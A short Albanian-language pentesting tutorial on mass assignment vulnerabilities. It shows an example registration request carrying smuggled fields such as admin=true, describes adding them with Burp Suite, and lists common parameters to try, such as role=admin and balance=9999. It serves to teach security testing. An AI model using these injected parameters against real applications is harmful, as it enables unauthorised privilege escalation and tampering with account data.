
### Ç'është?

Kur aplikacioni merr parametra nga useri dhe i fut **direkt në databazë/model** pa i filtruar, sulmuesi mund të shtojë parametra të paautorizuar.

---
### Si funksionon sulmi
```
POST /register
username=hacker&password=123&admin=true&confirmed=1
           ↑ normal          ↑ parametra të fshehur që provon sulmuesi
```
Aplikacioni i pranon të gjithë pa kontrolluar → **shkrim i paautorizuar në DB**.

---

### Si e gjen si Pentester

**1. Recon — gjej parametrat ekzistues**
```bash
POST /register → username, password
# Pyet: çfarë kolonash ka tabela? admin? confirmed? role? is_active?
```


Burp Suite — inject parametra shtesë
```bash
# Kap request-in, shto manualisht:
confirmed=1
admin=true
role=admin
is_approved=1
activated=true
```

### Parametra të zakonshëm për të provuar
```
admin=true / admin=1
role=admin / role=superuser
confirmed=1
is_active=true
approved=true
verified=1
balance=9999
```

**Rregulla e artë:** Nëse aplikacioni nuk ka **whitelist eksplicite** → provoje mass assignment.
